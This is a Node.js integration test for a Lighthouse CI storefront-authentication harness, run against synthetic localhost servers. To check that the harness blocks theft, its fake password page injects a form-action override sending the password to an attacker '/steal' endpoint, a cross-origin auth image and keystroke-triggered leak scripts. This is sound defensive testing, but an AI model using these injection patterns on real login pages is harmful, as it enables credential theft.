// Credential-free Linux container integration: real pinned Chromium, Puppeteer password
// submission, LHCI collection and custom scored-page identity. This is not a theme score.
const http = require('node:http');
const assert = require('node:assert/strict');
const {authenticate} = require('./auth.cjs');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const {promisify} = require('node:util');
const {execFile} = require('node:child_process');
const {collectionConfig,routes} = require('./core.cjs');
const {verifyReports} = require('./run.cjs');
const password = "synthetic ' \\ + password";
const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(),'lhci-smoke-')));
let passwordScriptExecuted = false;
let attackMethod;
let attackerOrigin;
let blockedEndpointHits = 0;
let allowedEndpointHits = 0;
const attacker = http.createServer((req,res) => {
  if (req.url === '/allowed.js') {
    allowedEndpointHits++;res.setHeader('Content-Type','application/javascript');res.end('window.harnessCrossOriginLoaded=true');
  } else {console.error('Unexpected endpoint',req.method,new URL(req.url,'http://localhost').pathname);blockedEndpointHits++;res.end('must never receive a password or authentication resource request');}
});
const server = http.createServer((req,res) => {
  const url = new URL(req.url,'http://localhost');
  if (url.pathname === '/credential-leak') {passwordScriptExecuted=true;res.end();return;}
  if (req.method === 'POST' && url.pathname === '/password') {
    let body='';req.on('data',d => {body+=d;});req.on('end',() => {
      if (new URLSearchParams(body).get('password') !== password) {res.writeHead(403);res.end();return;}
      res.writeHead(302,{'Set-Cookie':'storefront=granted; Path=/; HttpOnly',Location:'/'});res.end();
    });return;
  }
  if (url.pathname !== '/password' && !req.headers.cookie?.includes('storefront=granted')) {res.writeHead(302,{Location:'/password'});res.end();return;}
  res.setHeader('Content-Type','text/html');
  if (url.pathname === '/password') {
    const override = attackMethod ? ` formaction="${attackerOrigin}/steal" formmethod="${attackMethod}"` : '';
    res.end(`<!doctype html><form method="post" action="/password"><input type="password" name="password"><button${override}>Enter</button></form><img src="${attackerOrigin}/auth-resource"><script>fetch("/credential-leak");document.querySelector("input").addEventListener("input",()=>fetch("/credential-leak"));</script>`);return;
  }
  res.end('<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width"><title>Synthetic harness smoke</title></head><body><main><h1>Synthetic harness smoke</h1><p>This page checks browser wiring only.</p></main><script>window.Shopify={theme:{id:123,role:"unpublished"}}</script></body></html>'.replace('</body>',`<script src="${attackerOrigin}/allowed.js"></script></body>`));
});
(async () => {
  try {
    await new Promise(resolve => attacker.listen(0,'127.0.0.1',resolve));
    attackerOrigin=`http://127.0.0.1:${attacker.address().port}`;
    await new Promise(resolve => server.listen(0,'127.0.0.1',resolve));
    const c={mode:'lab',origin:`http://127.0.0.1:${server.address().port}`,product:'frame',collection:'frames'};
    const chrome=require('playwright').chromium.executablePath();
    const execute=promisify(execFile);
    const {stdout:version}=await execute(chrome,['--version']);
    if (!version.includes('153.0.8010.12')) throw Error('Wrong smoke browser version');
    const browser=await require('puppeteer').launch({executablePath:chrome,headless:true,args:['--no-sandbox','--disable-dev-shm-usage']});
    try {
      for (const method of ['get','post']) {
        attackMethod=method;
        await assert.rejects(authenticate(browser,{urls:routes(c,'123'),id:'123',mode:'lab',password}));
      }
      assert.equal(blockedEndpointHits,0,'Cross-origin GET/POST submitter overrides or auth resources leaked');
    } finally {attackMethod=undefined;await browser.close();}
    process.env.LHCI_AUTH_CONTEXT=path.join(dir,'auth.json');
    fs.writeFileSync(process.env.LHCI_AUTH_CONTEXT,JSON.stringify({urls:routes(c,'123'),id:'123',mode:'lab',password}));
    const config=collectionConfig(c,'123',chrome,path.relative(dir,path.join(__dirname,'auth.cjs')));
    const configFile=path.join(dir,'lighthouserc.json');fs.writeFileSync(configFile,JSON.stringify(config));
    await execute(process.execPath,[require.resolve('@lhci/cli/src/cli.js'),'collect',`--config=${configFile}`],{cwd:dir,env:process.env,timeout:600000,maxBuffer:32*1024*1024});
    try {await verifyReports(path.join(dir,'.lighthouseci'),c,'123');}
    catch (error) {
      // Only synthetic localhost diagnostics; never reused by the credentialed runner.
      for (const file of fs.readdirSync(path.join(dir,'.lighthouseci')).filter(n => /^lhr-\d+\.json$/.test(n))) {
        const r=JSON.parse(fs.readFileSync(path.join(dir,'.lighthouseci',file)));
        console.error(JSON.stringify({requested:r.requestedUrl,final:r.finalDisplayedUrl || r.finalUrl,
          status:r.audits['http-status-code'],identity:r.audits['lemoon-theme-identity']}));
      }
      throw error;
    }
    assert.equal(blockedEndpointHits,0,'Cross-origin authentication request reached attacker');
    assert.ok(allowedEndpointHits>0,'Normal readiness/scored pages must allow cross-origin resources');
    if (passwordScriptExecuted) throw Error('Candidate password-page JavaScript executed');
    console.log('PASS: cross-origin GET/POST submitter overrides and auth resources blocked; normal cross-origin scripts allowed; pinned Chromium, password/preview readiness, nine real LHCI reports and scored-page identity (synthetic localhost only).');
  } finally {server.close();attacker.close();fs.rmSync(dir,{recursive:true,force:true});}
})().catch(error => {console.error(error.message);process.exitCode=1;});
